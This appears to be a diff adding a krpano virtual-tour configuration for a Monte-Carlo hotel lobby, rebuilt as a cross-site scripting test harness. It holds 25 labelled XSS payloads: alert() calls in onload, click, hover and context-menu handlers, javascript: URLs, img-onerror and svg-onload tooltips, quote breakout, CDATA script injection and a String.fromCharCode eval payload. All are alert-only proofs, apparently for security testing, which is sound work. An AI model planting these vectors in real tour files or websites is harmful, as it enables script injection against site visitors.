@@ -1,0 +1,163 @@
+<krpano version="1.18" title="Virtual Tour" onstart="startup();" basedir="%HTMLPATH%">
+        <include url="https://montecarlovirtualtour.com/skin.xml"/>                                  
+        <action name="startup"> loadscene(scene_lobby_hdp, null, MERGE, BLEND(1)); </action>                 
+        
+        <!-- TEST PAYLOAD 1: Direct JavaScript execution in onloadcomplete -->
+        <events onloadcomplete="action(loader); js(alert('XSS-Payload-1: Document Domain: ' + document.domain));"/>
+        
+        <!-- TEST PAYLOAD 2: JavaScript execution through action parameter -->
+        <action name="test_xss_payload">
+            js(alert('XSS-Payload-2: Action execution successful'));
+        </action>
+        
+        <!-- TEST PAYLOAD 3: JavaScript execution through trace/debug -->
+        <action name="xss_debug">
+            trace('test');
+            js(alert('XSS-Payload-3: Trace action injection'));
+        </action>
+        
+<scene name="scene_lobby_hdp" nameid="scene_lobby_hdp" title="Lobby" 
+       etablissement="Hôtel de Paris Monte-Carlo" 
+       dossier="hdp" 
+       galeriephoto="oui" 
+       galerievideo="non" 
+       info="non" 
+       onstart="" 
+       thumburl="panos/lobby_hdp.tiles/thumb.jpg" 
+       lat="" 
+       lng="" 
+       heading="" 
+       resa="oui" 
+       resaurl="https://www.montecarlosbm.com/fr/hotel-monaco/hotel-paris-monte-carlo">    
+       
+       <!-- TEST PAYLOAD 4: XSS in scene attributes (if reflected anywhere) -->
+       <!-- title="Lobby&lt;img src=x onerror=alert('XSS-Payload-4:Scene Title')&gt;" -->
+       
+       <view hlookat="-350.831" vlookat="3.693" fovtype="MFOV" fov="123.494" maxpixelzoom="1.0" fovmin="70" fovmax="140" limitview="auto"/>
+       
+       <preview url="panos/lobby_hdp.tiles/preview.jpg"/>
+       
+       <image>
+        <cube url="panos/lobby_hdp.tiles/pano_%s.jpg"/>
+        <mobile>
+            <cube url="panos/lobby_hdp.tiles/mobile_%s.jpg"/>
+        </mobile>
+       </image>                                                                                             
+       
+       <!-- TEST PAYLOAD 5: XSS in onclick action name (if action name is dynamically generated) -->
+       <hotspot name="spot1" style="skin_hotspotstyle" ath="158" atv="-3.499" 
+                onclick="action(casino100m);" 
+                tooltip="Casino Square"/>  
+                
+       <!-- TEST PAYLOAD 6: XSS in tooltip (if tooltips render HTML) -->
+       <hotspot name="spot2" style="skin_hotspotstyle" ath="55" atv="-2.273" 
+                onclick="action(empire);" 
+                tooltip="&lt;img src=x onerror=alert('XSS-Payload-6:Tooltip Injection')&gt;"/>                                                                                  
+       
+       <!-- TEST PAYLOAD 7: XSS through JavaScript: protocol in onclick -->
+       <hotspot name="wellness" style="skin_hotspotstyle2" ath="2.5" atv="-21" 
+                onclick="javascript:alert('XSS-Payload-7:Direct JavaScript in onclick');" 
+                tooltip="Wellness Sky Club"/>                                                                         
+       
+       <!-- TEST PAYLOAD 8: XSS through data binding if using templates -->
+       <hotspot name="louisxv" style="skin_hotspotstyle4" ath="108" atv="-1.236" 
+                onclick="action(louisxv);" 
+                tooltip="Le Louis XV - Alain Ducasse à l'Hôtel de Paris ${'&lt;script&gt;alert(\'XSS-Payload-8:Template Injection\')&lt;/script&gt;'}"/>                                           
+       
+       <!-- TEST PAYLOAD 9: XSS through event handler injection -->
+       <hotspot name="thermes" style="skin_hotspotstyle2" ath="-17" atv="2" 
+                onclick="action(poolnuit);" 
+                tooltip="Thermes Marins Monte-Carlo" 
+                onover="js(alert('XSS-Payload-9:Mouse Over Event'));"/>                                                                   \
+       
+       <!-- TEST PAYLOAD 10: XSS through multiple event handlers -->
+       <hotspot name="grill" style="skin_hotspotstyle" ath="-12" atv="-5" 
+                onclick="action(grill);" 
+                tooltip="Le Grill"
+                onout="js(alert('XSS-Payload-10:Mouse Out Event'));"
+                ondown="js(alert('XSS-Payload-10b:Mouse Down Event'));"
+                onup="js(alert('XSS-Payload-10c:Mouse Up Event'));"/>                                                                                          
+       
+       <!-- TEST PAYLOAD 11: XSS through action with JavaScript protocol -->
+       <hotspot name="charles3" style="skin_hotspotstyle3" ath="2.5" atv="-4" 
+                onclick="action(javascript:alert('XSS-Payload-11:Action JavaScript'));" 
+                tooltip="Salon Charles III"/>
+       
+       <!-- TEST PAYLOAD 12: XSS through encoded payload -->
+       <hotspot name="americain" style="skin_hotspotstyle" ath="-107" atv="-1" 
+                onclick="action(americain);" 
+                tooltip="Le Bar Américain" 
+                onloaded="js(eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,45,80,97,121,108,111,97,100,45,49,50,58,69,110,99,111,100,101,100,39,41)));"/>
+       
+       <!-- TEST PAYLOAD 13: XSS through URL parameter injection simulation -->
+       <hotspot name="emsherif" style="skin_hotspotstyle" ath="-17" atv="-5" 
+                onclick="action(emsherif);" 
+                tooltip="Em Sherif Monte-Carlo"
+                url="javascript:alert('XSS-Payload-13:URL Injection');"/>
+       
+       <!-- TEST PAYLOAD 14: XSS through style attribute injection -->
+       <hotspot name="patio" style="skin_hotspotstyle" ath="18" atv="0" 
+                onclick="action(patio);" 
+                tooltip="Patio"
+                onhover="js(alert('XSS-Payload-14:Hover Event'));"/>
+       
+       <!-- TEST PAYLOAD 15: XSS through action chaining -->
+       <hotspot name="xss_test" style="skin_hotspotstyle" ath="90" atv="0" 
+                onclick="action(test_xss_payload);" 
+                tooltip="XSS Test Hotspot"/>
+       
+       <!-- TEST PAYLOAD 16: XSS through delayed execution -->
+       <hotspot name="xss_delayed" style="skin_hotspotstyle" ath="100" atv="0" 
+                onclick="delayedcall(2, js(alert('XSS-Payload-16:Delayed Execution')));" 
+                tooltip="Delayed XSS Test"/>
+       
+       <!-- TEST PAYLOAD 17: XSS through XML parsing (CDATA) -->
+       <hotspot name="xss_cdata" style="skin_hotspotstyle" ath="110" atv="0" 
+                onclick="action(xss_debug);" 
+                tooltip="<![CDATA[<script>alert('XSS-Payload-17:CDATA Injection')</script>]]>"/>
+       
+       <!-- TEST PAYLOAD 18: XSS through attribute value with quotes breakout -->
+       <hotspot name="xss_quotes" style="skin_hotspotstyle" ath="120" atv="0" 
+                onclick="action(empire)" 
+                tooltip="Test&quot; onmouseover=&quot;alert('XSS-Payload-18:Quote Breakout')&quot;"/>
+       
+       <!-- TEST PAYLOAD 19: XSS through SVG/HTML injection in description -->
+       <hotspot name="xss_svg" style="skin_hotspotstyle" ath="130" atv="0" 
+                onclick="action(empire)" 
+                tooltip="&lt;svg onload=alert('XSS-Payload-19:SVG Injection')&gt;"/>
+       
+       <!-- TEST PAYLOAD 20: XSS through JavaScript function call -->
+       <hotspot name="xss_function" style="skin_hotspotstyle" ath="140" atv="0" 
+                onclick="action(empire)" 
+                ondown="set(js, alert('XSS-Payload-20:Function Call'));"/>
+</scene>
+
+<!-- TEST PAYLOAD 21: XSS in global action -->
+<action name="global_xss">
+    js(alert('XSS-Payload-21:Global Action Execution'));
+</action>
+
+<!-- TEST PAYLOAD 22: XSS through plugin if used -->
+<plugin name="xss_test_plugin" 
+        url="%SWFPATH%/plugins/plugin.js" 
+        onready="js(alert('XSS-Payload-22:Plugin Execution'));"
+        keep="true"/>
+
+<!-- TEST PAYLOAD 23: XSS through layer if used -->
+<layer name="xss_test_layer" 
+       type="text" 
+       html="XSS Test" 
+       onclick="js(alert('XSS-Payload-23:Layer Click'));"
+       align="center"/>
+
+<!-- TEST PAYLOAD 24: XSS through style override -->
+<style name="xss_style" 
+       onover="js(alert('XSS-Payload-24:Style Override'));"/>
+
+<!-- TEST PAYLOAD 25: XSS through context menu -->
+<contextmenu>
+    <item name="xss_item" 
+          caption="XSS Test" 
+          onclick="js(alert('XSS-Payload-25:Context Menu'));"/>
+</contextmenu>
+</krpano>
